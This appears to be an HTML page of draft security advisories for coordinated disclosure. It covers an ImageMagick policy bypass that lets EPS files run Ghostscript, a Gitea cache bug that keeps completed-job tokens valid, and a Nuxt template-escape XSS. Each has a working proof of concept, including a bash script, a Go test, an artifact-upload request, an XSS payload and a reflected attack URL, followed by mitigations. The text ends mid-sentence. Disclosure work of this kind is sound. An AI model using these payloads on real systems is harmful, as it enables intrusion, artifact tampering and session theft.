+MAGICK_CONFIGURE_PATH=&quot;$CONF&quot; magick /tmp/test.eps /tmp/out_eps.png 2&gt;&amp;1 \
+  &amp;&amp; echo &quot;BYPASS — Ghostscript executed&quot; || echo &quot;OK (blocked)&quot;
+
+# 5. module policy — blocks all variants
+cat &gt; &quot;$CONF/policy.xml&quot; &lt;&lt; &#x27;EOF&#x27;
+&lt;policymap&gt;
+  &lt;policy domain=&quot;module&quot; rights=&quot;none&quot; pattern=&quot;PS&quot;/&gt;
+&lt;/policymap&gt;
+EOF
+echo -n &quot;.eps file with module policy: &quot;
+MAGICK_CONFIGURE_PATH=&quot;$CONF&quot; magick /tmp/test.eps /tmp/out_mod.png 2&gt;&amp;1 \
+  &amp;&amp; echo &quot;FAIL (not blocked)&quot; || echo &quot;OK (blocked)&quot;
+```
+
+**Output on ImageMagick 7.1.2-26** (real Ghostscript executed, produced a 420-byte
+rendered PNG on the bypass path):
+```
+PS: prefix (should block): OK (blocked)
+.eps file (should block):  BYPASS — Ghostscript executed
+.eps file with module policy: OK (blocked)
+```
+
+## Impact
+
+Administrators following ImageMagick&#x27;s own security hardening guide believe they
+have blocked Ghostscript execution, but any user-uploaded file with a `.eps`
+extension bypasses the restriction. Ghostscript with `-dSAFER` still presents a
+significant attack surface (multiple CVEs in recent years). Without `-dSAFER`,
+PostScript can read and write arbitrary files via the `file` operator.
+
+Any web service that processes user-uploaded images with ImageMagick and relies on
+`policy.xml` to block PostScript is affected.
+
+## Mitigation
+
+Use `domain=&quot;module&quot;` to block by module name (covers all PS variants):
+
+```xml
+&lt;policy domain=&quot;module&quot; rights=&quot;none&quot; pattern=&quot;PS&quot;/&gt;
+```
+
+Or block each format name explicitly:
+
+```xml
+&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PS&quot;/&gt;
+&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPS*&quot;/&gt;
+&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPI&quot;/&gt;
+```
+
+Or block at the delegate level:
+
+```xml
+&lt;policy domain=&quot;delegate&quot; rights=&quot;none&quot; pattern=&quot;gs&quot;/&gt;
+```
+
+The existing security documentation and policy.xml template should be updated to
+call out the distinction between `domain=&quot;coder&quot;` and `domain=&quot;module&quot;` for the PS
+module, and the recommended hardening snippet should use `domain=&quot;module&quot;`.</pre><button class="copy" data-target="f2-desc">Copy</button></div></div><pre class="hidden" id="f2-full">Title: policy.xml coder pattern=&quot;PS&quot; does not block EPS/EPSF/EPSI/EPI — Ghostscript executes
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (7.2, High)
+Weaknesses (CWE): CWE-284, CWE-863
+Ecosystem: Other (C library — distributed via OS packages/source)
+Package name: ImageMagick
+Affected versions: 7.x through 7.1.2-26 (6.x likely affected)
+Patched versions: None
+
+Description:
+## Summary
+
+The ImageMagick `policy.xml` hardening guide instructs administrators to add
+`&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PS&quot;/&gt;` to block PostScript/Ghostscript
+processing. This policy only matches files where the internal format identifier
+equals `&quot;PS&quot;`. The PostScript coder module (`coders/ps.c`) registers five format
+names under the same module: `PS`, `EPS`, `EPSF`, `EPSI`, and `EPI`. The policy
+check (`IsCoderAuthorized`) evaluates the format name, not the module name, so any
+EPS-family file bypasses the restriction and causes Ghostscript to execute on the
+attacker-controlled content.
+
+## Description
+
+`coders/ps.c` registers all PostScript variants under the single module `&quot;PS&quot;`:
+
+```c
+entry = AcquireMagickInfo(&quot;PS&quot;, &quot;EPS&quot;,  &quot;Encapsulated PostScript&quot;);  // line 979
+entry = AcquireMagickInfo(&quot;PS&quot;, &quot;EPSF&quot;, &quot;Encapsulated PostScript&quot;);  // line 988
+entry = AcquireMagickInfo(&quot;PS&quot;, &quot;EPSI&quot;, &quot;Encapsulated PostScript Interchange&quot;); // line 997
+entry = AcquireMagickInfo(&quot;PS&quot;, &quot;EPI&quot;,  &quot;Encapsulated PostScript Interchange&quot;); // line 969
+```
+
+The arguments are `(module, format, description)`. `IsCoderAuthorized` at
+`MagickCore/constitute.c:454` checks the format name:
+
+```c
+status = IsRightsAuthorized(CoderPolicyDomain, rights, coder);
+// coder = read_info-&gt;magick = &quot;EPS&quot; for a .eps file
+// policy pattern = &quot;PS&quot;
+// &quot;PS&quot; does not match &quot;EPS&quot; → check passes → Ghostscript executes
+```
+
+The module name is checked separately against `ModulePolicyDomain` (line 456), but
+only `domain=&quot;module&quot;` policies reach that branch. A `domain=&quot;coder&quot;` policy with
+`pattern=&quot;PS&quot;` never evaluates the module name.
+
+&gt; Source-anchor note: line numbers drift by ~6 lines depending on the pinned commit;
+&gt; `magick -list format` confirms the `EPS`/`EPSF`/`EPSI`/`EPI → module PS` mapping
+&gt; directly regardless of commit.
+
+## Proof of Concept
+
+```bash
+#!/usr/bin/env bash
+# Requires ImageMagick 7.x and Ghostscript installed.
+
+# 1. Write a policy that &quot;blocks PS&quot;
+CONF=$(mktemp -d)
+cat &gt; &quot;$CONF/policy.xml&quot; &lt;&lt; &#x27;EOF&#x27;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE policymap [
+  &lt;!ELEMENT policymap (policy)*&gt;
+  &lt;!ELEMENT policy EMPTY&gt;
+  &lt;!ATTLIST policy domain NMTOKEN #REQUIRED&gt;
+  &lt;!ATTLIST policy rights NMTOKEN #IMPLIED&gt;
+  &lt;!ATTLIST policy pattern CDATA #IMPLIED&gt;
+]&gt;
+&lt;policymap&gt;
+  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PS&quot;/&gt;
+&lt;/policymap&gt;
+EOF
+
+# 2. Minimal EPS file
+printf &#x27;%%!PS-Adobe-3.0 EPSF-3.0\n%%%%BoundingBox: 0 0 72 72\nshowpage\n&#x27; &gt; /tmp/test.eps
+
+# 3. Explicit PS: prefix — correctly blocked
+echo -n &quot;PS: prefix (should block): &quot;
+MAGICK_CONFIGURE_PATH=&quot;$CONF&quot; magick PS:/tmp/test.eps /tmp/out.png 2&gt;&amp;1 \
+  &amp;&amp; echo &quot;FAIL (not blocked)&quot; || echo &quot;OK (blocked)&quot;
+
+# 4. .eps extension — bypass
+echo -n &quot;.eps file (should block):  &quot;
+MAGICK_CONFIGURE_PATH=&quot;$CONF&quot; magick /tmp/test.eps /tmp/out_eps.png 2&gt;&amp;1 \
+  &amp;&amp; echo &quot;BYPASS — Ghostscript executed&quot; || echo &quot;OK (blocked)&quot;
+
+# 5. module policy — blocks all variants
+cat &gt; &quot;$CONF/policy.xml&quot; &lt;&lt; &#x27;EOF&#x27;
+&lt;policymap&gt;
+  &lt;policy domain=&quot;module&quot; rights=&quot;none&quot; pattern=&quot;PS&quot;/&gt;
+&lt;/policymap&gt;
+EOF
+echo -n &quot;.eps file with module policy: &quot;
+MAGICK_CONFIGURE_PATH=&quot;$CONF&quot; magick /tmp/test.eps /tmp/out_mod.png 2&gt;&amp;1 \
+  &amp;&amp; echo &quot;FAIL (not blocked)&quot; || echo &quot;OK (blocked)&quot;
+```
+
+**Output on ImageMagick 7.1.2-26** (real Ghostscript executed, produced a 420-byte
+rendered PNG on the bypass path):
+```
+PS: prefix (should block): OK (blocked)
+.eps file (should block):  BYPASS — Ghostscript executed
+.eps file with module policy: OK (blocked)
+```
+
+## Impact
+
+Administrators following ImageMagick&#x27;s own security hardening guide believe they
+have blocked Ghostscript execution, but any user-uploaded file with a `.eps`
+extension bypasses the restriction. Ghostscript with `-dSAFER` still presents a
+significant attack surface (multiple CVEs in recent years). Without `-dSAFER`,
+PostScript can read and write arbitrary files via the `file` operator.
+
+Any web service that processes user-uploaded images with ImageMagick and relies on
+`policy.xml` to block PostScript is affected.
+
+## Mitigation
+
+Use `domain=&quot;module&quot;` to block by module name (covers all PS variants):
+
+```xml
+&lt;policy domain=&quot;module&quot; rights=&quot;none&quot; pattern=&quot;PS&quot;/&gt;
+```
+
+Or block each format name explicitly:
+
+```xml
+&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PS&quot;/&gt;
+&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPS*&quot;/&gt;
+&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPI&quot;/&gt;
+```
+
+Or block at the delegate level:
+
+```xml
+&lt;policy domain=&quot;delegate&quot; rights=&quot;none&quot; pattern=&quot;gs&quot;/&gt;
+```
+
+The existing security documentation and policy.xml template should be updated to
+call out the distinction between `domain=&quot;coder&quot;` and `domain=&quot;module&quot;` for the PS
+module, and the recommended hardening snippet should use `domain=&quot;module&quot;`.
+</pre></section><section class="card" id="f3"><div class="chead"><div class="ctitle"><span class="sev high">High</span><span class="cname">3. Completed-job GITEA_TOKEN remains valid due to LRU cache bypass in GetRunningTaskByToken</span></div><div class="cmeta"><span class="badge tier1">Tier 1</span><span class="badge chan">EMAIL (security@gitea.io)</span><button class="copy copyall" data-target="f3-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f3-title">Completed-job GITEA_TOKEN remains valid due to LRU cache bypass in GetRunningTaskByToken</pre><button class="copy" data-target="f3-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f3-cve">Request CVE ID later</pre><button class="copy" data-target="f3-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (7.1, High)</div><div class="frow"><pre class="fval" id="f3-cvss">AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N</pre><button class="copy" data-target="f3-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f3-cwe">CWE-613</pre><button class="copy" data-target="f3-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f3-eco">Go</pre><button class="copy" data-target="f3-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f3-pkg">code.gitea.io/gitea</pre><button class="copy" data-target="f3-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f3-aff">all versions with SUCCESSFUL_TOKENS_CACHE_SIZE &gt; 0 (default 20)</pre><button class="copy" data-target="f3-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f3-patched">None</pre><button class="copy" data-target="f3-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f3-desc">## Summary
+
+`GetRunningTaskByToken` maintains an LRU cache mapping a runner&#x27;s `GITEA_TOKEN` to
+its task ID. On a cache hit the function retrieves the task by primary key with no
+status filter, returning it unconditionally if the row exists. On a cache miss it
+queries the database with `status IN (Running, Cancelling)`. The cache is evicted
+only when the task row is deleted, not when the task transitions to a terminal state.
+As a result, a job&#x27;s `GITEA_TOKEN` continues to authenticate artifact upload
+requests via the old act_runner API path after the job has completed, allowing a
+runner to inject artifacts into a finished workflow run.
+
+## Description
+
+`models/actions/task.go:180-193` — cache-hit path:
+
+```go
+if id := getTaskIDFromCache(token); id &gt; 0 {
+    task := &amp;ActionTask{TokenLastEight: lastEight}
+    has, err := db.GetEngine(ctx).ID(id).Get(task)
+    if err != nil {
+        return nil, err
+    }
+    if has {
+        return task, nil   // no status check — task may be Done/Success/Failure
+    }
+    successfulTokenTaskCache.Remove(token)
+}
+```
+
+Database fallback path at line 197 — correctly filtered:
+
+```go
+err := db.GetEngine(ctx).Where(
+    &quot;token_last_eight = ? AND status IN (?, ?)&quot;,
+    lastEight, StatusRunning, StatusCancelling,
+).Find(&amp;tasks)
+```
+
+The old act_runner artifact path at `routers/api/actions/artifacts.go:162-171`
+performs no secondary status check after `GetRunningTaskByToken` returns:
+
+```go
+authToken := strings.TrimPrefix(authHeader, &quot;Bearer &quot;)
+task, err = actions.GetRunningTaskByToken(req.Context(), authToken)
+if err != nil {
+    ctx.HTTPError(http.StatusInternalServerError, &quot;...&quot;)
+    return
+}
+// task.Status is not checked — proceeds directly to artifact upload
+```
+
+The new JWT path at line 157 does check `task.Status != actions.StatusRunning`
+explicitly, but the old path does not. Gitea continues to accept old act_runner
+tokens, so this path remains reachable.
+
+## Proof of Concept
+
+```go
+// Run in the gitea repository:
+// go test -v -run TestGetRunningTaskByToken_CacheBypassAfterCompletion ./models/actions/
+
+func TestGetRunningTaskByToken_CacheBypassAfterCompletion(t *testing.T) {
+    // 1. Create a running task — this populates the LRU cache
+    task := &amp;ActionTask{Status: StatusRunning, Token: &quot;tok&quot;, TokenLastEight: &quot;lastEigh&quot;}
+    require.NoError(t, db.Insert(ctx, task))
+
+    // 2. Authenticate once — warms the cache
+    cached, err := GetRunningTaskByToken(ctx, &quot;tok&quot;)
+    require.NoError(t, err)
+    require.Equal(t, StatusRunning, cached.Status)
+
+    // 3. Transition task to Done
+    task.Status = StatusSuccess
+    require.NoError(t, UpdateTask(ctx, task, &quot;status&quot;))
+
+    // 4. Authenticate again — DB says Done, cache says Running
+    result, err := GetRunningTaskByToken(ctx, &quot;tok&quot;)
+    // VULNERABLE: returns the done task instead of an error
+    if err == nil &amp;&amp; result != nil &amp;&amp; result.Status == StatusSuccess {
+        t.Log(&quot;VULNERABLE: completed task token accepted&quot;)
+    }
+}
+```
+
+**Expected result (patched)**: error or nil returned.
+**Actual result (current)**: task returned with `Status == StatusSuccess`.
+
+&gt; Verified against real HEAD: the test passes (the bug reproduces) — a completed
+&gt; job&#x27;s token returns a `status=success` task on the cache-hit path. Live by default
+&gt; since `SUCCESSFUL_TOKENS_CACHE_SIZE` defaults to 20. The model-layer bypass is
+&gt; proven directly; the downstream artifact-upload write is argued from the unguarded
+&gt; call site, not independently executed.
+
+## Impact
+
+An attacker (runner or compromised runner credentials) who completes a CI job can,
+while their token remains in the LRU cache (window determined by cache size and
+subsequent job activity — up to the next 20 token authentications by other runners),
+POST arbitrary files to the completed run&#x27;s artifact endpoint:
+
+```
+POST /api/actions_pipeline/_apis/pipelines/workflows/{run_id}/artifacts
+Authorization: Bearer &lt;completed-job-GITEA_TOKEN&gt;
+```
+
+The artifact appears in the run&#x27;s artifact list with `ArtifactStatusUploadConfirmed`.
+Downstream systems that trust artifacts from completed runs — release pipelines,
+deployment scripts, binary distribution — may process or distribute the tampered
+content.
+
+## Mitigation
+
+**Option A — add status check in the cache-hit path** (minimal change):
+
+```go
+if has {
+    if !task.Status.IsDone() {
+        return task, nil
+    }
+    successfulTokenTaskCache.Remove(token)
+}
+```
+
+**Option B — evict on status transition** (preferred):
+
+In `UpdateTask`, when `status` is among the updated columns and the new value is
+terminal, call `successfulTokenTaskCache.Remove(task.Token)` before returning.
+
+**Option C — add secondary check at the artifact handler call site**:
+
+```go
+task, err = actions.GetRunningTaskByToken(req.Context(), authToken)
+if err == nil &amp;&amp; task != nil &amp;&amp; task.Status.IsDone() {
+    ctx.HTTPError(http.StatusUnauthorized, &quot;task is no longer running&quot;)
+    return
+}
+```</pre><button class="copy" data-target="f3-desc">Copy</button></div></div><pre class="hidden" id="f3-full">Title: Completed-job GITEA_TOKEN remains valid due to LRU cache bypass in GetRunningTaskByToken
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N (7.1, High)
+Weaknesses (CWE): CWE-613
+Ecosystem: Go
+Package name: code.gitea.io/gitea
+Affected versions: all versions with SUCCESSFUL_TOKENS_CACHE_SIZE &gt; 0 (default 20)
+Patched versions: None
+
+Description:
+## Summary
+
+`GetRunningTaskByToken` maintains an LRU cache mapping a runner&#x27;s `GITEA_TOKEN` to
+its task ID. On a cache hit the function retrieves the task by primary key with no
+status filter, returning it unconditionally if the row exists. On a cache miss it
+queries the database with `status IN (Running, Cancelling)`. The cache is evicted
+only when the task row is deleted, not when the task transitions to a terminal state.
+As a result, a job&#x27;s `GITEA_TOKEN` continues to authenticate artifact upload
+requests via the old act_runner API path after the job has completed, allowing a
+runner to inject artifacts into a finished workflow run.
+
+## Description
+
+`models/actions/task.go:180-193` — cache-hit path:
+
+```go
+if id := getTaskIDFromCache(token); id &gt; 0 {
+    task := &amp;ActionTask{TokenLastEight: lastEight}
+    has, err := db.GetEngine(ctx).ID(id).Get(task)
+    if err != nil {
+        return nil, err
+    }
+    if has {
+        return task, nil   // no status check — task may be Done/Success/Failure
+    }
+    successfulTokenTaskCache.Remove(token)
+}
+```
+
+Database fallback path at line 197 — correctly filtered:
+
+```go
+err := db.GetEngine(ctx).Where(
+    &quot;token_last_eight = ? AND status IN (?, ?)&quot;,
+    lastEight, StatusRunning, StatusCancelling,
+).Find(&amp;tasks)
+```
+
+The old act_runner artifact path at `routers/api/actions/artifacts.go:162-171`
+performs no secondary status check after `GetRunningTaskByToken` returns:
+
+```go
+authToken := strings.TrimPrefix(authHeader, &quot;Bearer &quot;)
+task, err = actions.GetRunningTaskByToken(req.Context(), authToken)
+if err != nil {
+    ctx.HTTPError(http.StatusInternalServerError, &quot;...&quot;)
+    return
+}
+// task.Status is not checked — proceeds directly to artifact upload
+```
+
+The new JWT path at line 157 does check `task.Status != actions.StatusRunning`
+explicitly, but the old path does not. Gitea continues to accept old act_runner
+tokens, so this path remains reachable.
+
+## Proof of Concept
+
+```go
+// Run in the gitea repository:
+// go test -v -run TestGetRunningTaskByToken_CacheBypassAfterCompletion ./models/actions/
+
+func TestGetRunningTaskByToken_CacheBypassAfterCompletion(t *testing.T) {
+    // 1. Create a running task — this populates the LRU cache
+    task := &amp;ActionTask{Status: StatusRunning, Token: &quot;tok&quot;, TokenLastEight: &quot;lastEigh&quot;}
+    require.NoError(t, db.Insert(ctx, task))
+
+    // 2. Authenticate once — warms the cache
+    cached, err := GetRunningTaskByToken(ctx, &quot;tok&quot;)
+    require.NoError(t, err)
+    require.Equal(t, StatusRunning, cached.Status)
+
+    // 3. Transition task to Done
+    task.Status = StatusSuccess
+    require.NoError(t, UpdateTask(ctx, task, &quot;status&quot;))
+
+    // 4. Authenticate again — DB says Done, cache says Running
+    result, err := GetRunningTaskByToken(ctx, &quot;tok&quot;)
+    // VULNERABLE: returns the done task instead of an error
+    if err == nil &amp;&amp; result != nil &amp;&amp; result.Status == StatusSuccess {
+        t.Log(&quot;VULNERABLE: completed task token accepted&quot;)
+    }
+}
+```
+
+**Expected result (patched)**: error or nil returned.
+**Actual result (current)**: task returned with `Status == StatusSuccess`.
+
+&gt; Verified against real HEAD: the test passes (the bug reproduces) — a completed
+&gt; job&#x27;s token returns a `status=success` task on the cache-hit path. Live by default
+&gt; since `SUCCESSFUL_TOKENS_CACHE_SIZE` defaults to 20. The model-layer bypass is
+&gt; proven directly; the downstream artifact-upload write is argued from the unguarded
+&gt; call site, not independently executed.
+
+## Impact
+
+An attacker (runner or compromised runner credentials) who completes a CI job can,
+while their token remains in the LRU cache (window determined by cache size and
+subsequent job activity — up to the next 20 token authentications by other runners),
+POST arbitrary files to the completed run&#x27;s artifact endpoint:
+
+```
+POST /api/actions_pipeline/_apis/pipelines/workflows/{run_id}/artifacts
+Authorization: Bearer &lt;completed-job-GITEA_TOKEN&gt;
+```
+
+The artifact appears in the run&#x27;s artifact list with `ArtifactStatusUploadConfirmed`.
+Downstream systems that trust artifacts from completed runs — release pipelines,
+deployment scripts, binary distribution — may process or distribute the tampered
+content.
+
+## Mitigation
+
+**Option A — add status check in the cache-hit path** (minimal change):
+
+```go
+if has {
+    if !task.Status.IsDone() {
+        return task, nil
+    }
+    successfulTokenTaskCache.Remove(token)
+}
+```
+
+**Option B — evict on status transition** (preferred):
+
+In `UpdateTask`, when `status` is among the updated columns and the new value is
+terminal, call `successfulTokenTaskCache.Remove(task.Token)` before returning.
+
+**Option C — add secondary check at the artifact handler call site**:
+
+```go
+task, err = actions.GetRunningTaskByToken(req.Context(), authToken)
+if err == nil &amp;&amp; task != nil &amp;&amp; task.Status.IsDone() {
+    ctx.HTTPError(http.StatusUnauthorized, &quot;task is no longer running&quot;)
+    return
+}
+```
+</pre></section><section class="card" id="f4"><div class="chead"><div class="ctitle"><span class="sev high">High</span><span class="cname">4. XSS via unescaped &lt;/template&gt; in streaming island teleports</span></div><div class="cmeta"><span class="badge tier1">Tier 1</span><span class="badge chan">GHSA preferred (email alt: security@nuxtjs.org)</span><button class="copy copyall" data-target="f4-full">Copy entire submission</button></div></div><div class="field"><div class="flabel">Advisory title</div><div class="frow"><pre class="fval" id="f4-title">XSS via unescaped &lt;/template&gt; in streaming island teleports</pre><button class="copy" data-target="f4-title">Copy</button></div></div><div class="field"><div class="flabel">CVE identifier</div><div class="frow"><pre class="fval" id="f4-cve">Request CVE ID later</pre><button class="copy" data-target="f4-cve">Copy</button></div></div><div class="field"><div class="flabel">Severity — CVSS v3.1 vector (7.5, High)</div><div class="frow"><pre class="fval" id="f4-cvss">AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N</pre><button class="copy" data-target="f4-cvss">Copy</button></div></div><div class="field"><div class="flabel">Weaknesses (CWE)</div><div class="frow"><pre class="fval" id="f4-cwe">CWE-79</pre><button class="copy" data-target="f4-cwe">Copy</button></div></div><div class="field"><div class="flabel">Ecosystem</div><div class="frow"><pre class="fval" id="f4-eco">npm</pre><button class="copy" data-target="f4-eco">Copy</button></div></div><div class="field"><div class="flabel">Package name</div><div class="frow"><pre class="fval" id="f4-pkg">nuxt</pre><button class="copy" data-target="f4-pkg">Copy</button></div></div><div class="field"><div class="flabel">Affected versions</div><div class="frow"><pre class="fval" id="f4-aff">&gt;= 4.0.0 (with experimental.ssrStreaming.enabled: true)</pre><button class="copy" data-target="f4-aff">Copy</button></div></div><div class="field"><div class="flabel">Patched versions</div><div class="frow"><pre class="fval" id="f4-patched">None</pre><button class="copy" data-target="f4-patched">Copy</button></div></div><div class="field"><div class="flabel">Description</div><div class="frow"><pre class="fval big" id="f4-desc">## Summary
+
+When SSR streaming is enabled, `renderStreamedIslandTeleports` writes island slot
+content directly into `&lt;template&gt;` wrapper elements without encoding or escaping
+`&lt;/template&gt;` sequences. A `&lt;/template&gt;` in the content causes the browser&#x27;s HTML
+parser to close the wrapper prematurely. Everything after the premature close is
+parsed as live DOM instead of an inert `DocumentFragment`, so injected scripts and
+event handlers execute before Vue hydration.
+
+## Description
+
+Nuxt&#x27;s streaming renderer emits island teleport content as:
+
+```html
+&lt;template data-island-uid=&quot;abc&quot; data-island-slot=&quot;default&quot;&gt;
+  {teleportContent}
+&lt;/template&gt;
+```
+
+`teleportContent` is whatever Vue&#x27;s SSR renderer produced for the slot — including
+verbatim `v-html` output. The relevant code in
+`packages/nitro-server/src/runtime/utils/renderer/islands.ts`:
+
+```typescript
+// line 91 — slot teleport, primary vector
+templates += `&lt;template data-island-uid=&quot;${uid}&quot; data-island-slot=&quot;${slot}&quot;&gt;${teleports[key]}&lt;/template&gt;`
+
+// line 84 — client component teleport, same issue
+templates += `&lt;template data-island-uid=&quot;${uid}&quot; data-island-component=&quot;${clientId}&quot;&gt;${teleports[key]}&lt;/template&gt;`
+```
+
+`teleports[key]` is not sanitized at either site.
+
+The HTML5 specification defines &quot;in template&quot; insertion mode: on encountering a
+`&lt;/template&gt;` end tag the parser pops the element from the open element stack and
+switches back to normal insertion mode. Content parsed after that point is live DOM,
+not the inert `DocumentFragment` that lives inside a `&lt;template&gt;`. Inline event
+handlers on those elements fire immediately during parsing — before Vue&#x27;s
+`ISLAND_TELEPORT_RELOCATE_SCRIPT` runs, and before any nonce-based CSP can
+intervene (nonces apply to `&lt;script&gt;` elements, not to `onerror`/`onload`).
+
+## Attack Conditions
+
+1. The application has `experimental.ssrStreaming.enabled: true` in `nuxt.config.ts`.
+2. A `*.server.vue` island component exposes a named `&lt;slot&gt;`.
+3. The slot renders user-supplied data via `v-html`.
+
+All three conditions appear in production applications. Nuxt&#x27;s own streaming test
+fixture (`test/fixtures/ssr-streaming/components/IslandWithSlot.server.vue`) uses
+named slots on island components.
+
+## Proof of Concept
+
+```javascript
+// Replicates renderStreamedIslandTeleports from islands.ts:74-96 exactly.
+// Run with: node poc.js
+
+const SSR_SLOT_TELEPORT_MARKER   = /^uid=([^;]*);slot=(.*)$/
+const SSR_CLIENT_TELEPORT_MARKER = /^uid=([^;]*);client=(.*)$/
+
+const ISLAND_TELEPORT_RELOCATE_SCRIPT =
+  `(()=&gt;{for(const t of document.querySelectorAll(&#x27;template[data-island-uid]&#x27;)){` +
+  `const u=t.getAttribute(&#x27;data-island-uid&#x27;),s=t.getAttribute(&#x27;data-island-slot&#x27;),` +
+  `c=t.getAttribute(&#x27;data-island-component&#x27;),` +
+  `a=document.querySelector(&#x27;[data-island-uid=&quot;&#x27;+u+&#x27;&quot;]&#x27;+(s!==null?` +
+  `&#x27;[data-island-slot=&quot;&#x27;+s+&#x27;&quot;]&#x27;:&#x27;[data-island-component=&quot;&#x27;+c+&#x27;&quot;]&#x27;));` +
+  `if(a){a.insertBefore(t.content,a.firstChild)}t.remove()}})()`
+
+function renderStreamedIslandTeleports(ssrContext, nonceAttr = &#x27;&#x27;) {
+  const { teleports, islandContext } = ssrContext
+  if (islandContext || !teleports) return &#x27;&#x27;
+  let templates = &#x27;&#x27;
+  for (const key in teleports) {
+    const matchClientComp = key.match(SSR_CLIENT_TELEPORT_MARKER)
+    if (matchClientComp) {
+      const [, uid, clientId] = matchClientComp
+      if (!uid || !clientId) continue
+      templates += `&lt;template data-island-uid=&quot;${uid}&quot; data-island-component=&quot;${clientId}&quot;&gt;${teleports[key]}&lt;/template&gt;`
+      continue
+    }
+    const matchSlot = key.match(SSR_SLOT_TELEPORT_MARKER)
+    if (matchSlot) {
+      const [, uid, slot] = matchSlot
+      if (!uid || !slot) continue
+      templates += `&lt;template data-island-uid=&quot;${uid}&quot; data-island-slot=&quot;${slot}&quot;&gt;${teleports[key]}&lt;/template&gt;`
+    }
+  }
+  if (!templates) return &#x27;&#x27;
+  return templates + `&lt;script${nonceAttr}&gt;${ISLAND_TELEPORT_RELOCATE_SCRIPT}&lt;/script&gt;`
+}
+
+// Attacker payload — delivered via v-html=&quot;$route.query.comment&quot;
+const payload = &#x27;&lt;/template&gt;&lt;img src=x onerror=&quot;document.title=\&#x27;XSS\&#x27;&quot;&gt;&#x27;
+
+const output = renderStreamedIslandTeleports({
+  teleports: { &#x27;uid=abc123;slot=default&#x27;: `&lt;p&gt;safe content&lt;/p&gt;${payload}` },
+  islandContext: null
+})
+
+console.log(output)
+// → &lt;template ...&gt;&lt;p&gt;safe content&lt;/p&gt;&lt;/template&gt;&lt;img src=x onerror=&quot;...&quot;&gt;&lt;/template&gt;&lt;script&gt;...&lt;/script&gt;
+//                                               ^^^ parser exits template mode here; img is live DOM
+```
+
+Loading the output in a browser sets `document.title` to `&quot;XSS&quot;` before any Vue
+code runs.
+
+**Attack URL** (reflected variant):
+```
+https://example.com/?comment=%3C%2Ftemplate%3E%3Cscript%3Ealert(origin)%3C%2Fscript%3E
+```
+
+## Impact
+
+Arbitrary JavaScript execution in the victim&#x27;s browser context. Full session access
+(cookies, storage, tokens). The XSS is server-rendered into the streaming response
+and affects every user who loads the poisoned page.
+
+## Mitigation
+
+Escape `&lt;/template&gt;` before interpolating teleport content:
+
+```typescript
+function escapeTemplateClose(s: string): string {
+  return s.replace(/&lt;\/template&gt;/gi, &#x27;&lt;\\/template&gt;&#x27;)
+}
+
+// line 91:
+templates += `&lt;template data-island-uid=&quot;${uid}&quot; data-island-slot=&quot;${slot}&quot;&gt;${escapeTemplateClose(teleports[key])}&lt;/template&gt;`
+```
+
+Alternatively, transport teleport content through a Base64-encoded data attribute to
+remove the dependency on HTML parser behaviour entirely.</pre><button class="copy" data-target="f4-desc">Copy</button></div></div><pre class="hidden" id="f4-full">Title: XSS via unescaped &lt;/template&gt; in streaming island teleports
+CVE identifier: Request CVE ID later
+Severity (CVSS v3.1): AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:N (7.5, High)
+Weaknesses (CWE): CWE-79
+Ecosystem: npm
+Package name: nuxt
+Affected versions: &gt;= 4.0.0 (with experimental.ssrStreaming.enabled: true)
+Patched versions: None
+
+Description:
+## Summary
+
+When SSR streaming is enabled, `renderStreamedIslandTeleports` writes island slot
+content directly into `&lt;template&gt;` wrapper elements without encoding or escaping
+`&lt;/template&gt;` sequences. A `&lt;/template&gt;` in the content causes the browser&#x27;s HTML
+parser to close the wrapper prematurely. Everything after the premature close is
+parsed as live DOM instead of an inert `DocumentFragment`, so injected scripts and
+event handlers execute before Vue hydration.
+
+## Description
+
+Nuxt&#x27;s streaming renderer emits island teleport content as:
+
+```html
+&lt;template data-island-uid=&quot;abc&quot; data-island-slot=&quot;default&quot;&gt;
+  {teleportContent}
+&lt;/template&gt;
+```
+
+`teleportContent` is whatever Vue&#x27;s SSR renderer produced for the slot — including
+verbatim `v-html` output. The relevant code in
+`packages/nitro-server/src/runtime/utils/renderer/islands.ts`:
+
+```typescript
+// line 91 — slot teleport, primary vector
+templates += `&lt;template data-island-uid=&quot;${uid}&quot; data-island-slot=&quot;${slot}&quot;&gt;${teleports[key]}&lt;/template&gt;`
+
+// line 84 — client component teleport, same issue
+templates += `&lt;template data-island-uid=&quot;${uid}&quot; data-island-component=&quot;${clientId}&quot;&gt;${teleports[key]}&lt;/template&gt;`
+```
+
+`teleports[key]` is not sanitized at either site.
+
+The HTML5 specification defines &quot;in template&quot; insertion mode: on encountering a
+`&lt;/template&gt;` end tag the parser pops the element from the open element stack and
